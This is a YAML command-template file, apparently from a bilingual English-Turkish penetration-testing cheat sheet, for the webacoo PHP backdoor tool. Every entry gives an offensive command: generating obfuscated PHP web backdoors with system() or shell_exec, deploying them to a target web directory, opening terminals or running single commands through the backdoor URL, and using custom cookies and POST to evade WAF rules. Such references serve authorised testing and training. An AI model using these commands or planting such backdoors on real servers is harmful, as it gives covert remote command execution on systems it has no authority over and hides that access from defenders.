tool: webacoo
tags: [web, pentest, backdoor, post-exploitation, c2]

actions:
 - title:
     en: webacoo - generate backdoor
     tr: webacoo - arka kapı üretme
   desc:
     en: |
       Generates an obfuscated PHP backdoor using system() by default.
       Deploy the output file to the target web directory for access.
     tr: |
       Varsayılan olarak system() kullanan, gizlenmiş bir PHP arka kapısı üretir.
       Erişim için çıktı dosyasını hedef web dizinine yükleyin.
   command: "webacoo -g -o {{output|backdoor.php}}"

 - title:
     en: webacoo - generate with shell_exec
     tr: webacoo - shell_exec ile üretme
   desc:
     en: |
       Generates the backdoor using shell_exec instead of system.
       Use when system() is disabled in php.ini on the target.
     tr: |
       system yerine shell_exec kullanan arka kapıyı üretir.
       Hedefte php.ini içinde system() devre dışıysa kullanın.
   command: "webacoo -g -f 2 -o {{output|backdoor.php}}"

 - title:
     en: webacoo - generate raw backdoor
     tr: webacoo - ham arka kapı üretme
   desc:
     en: |
       Outputs the backdoor code without obfuscation for review.
       Handy to inspect what will run on the target before deploying.
     tr: |
       İnceleme için arka kapı kodunu gizlemeden verir.
       Hedefte çalışacak kodu dağıtmadan önce denetlemek için pratiktir.
   command: "webacoo -g -f {{func_num|1}} -o {{output|backdoor.php}} -r"

 - title:
     en: webacoo - terminal session
     tr: webacoo - terminal oturumu
   desc:
     en: |
       Opens an interactive terminal through the deployed backdoor URL.
       Cookie-based channel blends commands into normal HTTP traffic.
     tr: |
       Dağıtılan arka kapı URL'si üzerinden etkileşimli bir terminal açar.
       Çerez tabanlı kanal komutları normal HTTP trafiğine karıştırır.
   command: "webacoo -t -u {{url|http://target/backdoor.php}}"

 - title:
     en: webacoo - single command exec
     tr: webacoo - tek komut çalıştırma
   desc:
     en: |
       Runs one command through the backdoor without an interactive session.
       Best for scripting or one-shot checks during post-exploitation.
     tr: |
       Etkileşimli oturum açmadan arka kapı üzerinden tek bir komut çalıştırır.
       Sömürü sonrası tek seferlik kontroller veya betikler için idealdir.
   command: "webacoo -t -u {{url|http://target/backdoor.php}} -e {{command|id}}"

 - title:
     en: webacoo - custom cookie and method
     tr: webacoo - özel çerez ve yöntem
   desc:
     en: |
       Connects using a custom cookie name and POST method for evasion.
       Non-default names and POST blend better past naive WAF rules.
     tr: |
       Kaçınma için özel çerez adı ve POST yöntemiyle bağlanır.
       Varsayılan dışı adlar ve POST, basit WAF kurallarına daha iyi karışır.
   command: "webacoo -t -u {{url|http://target/backdoor.php}} -m POST -c {{cookie|M-cookie}}"
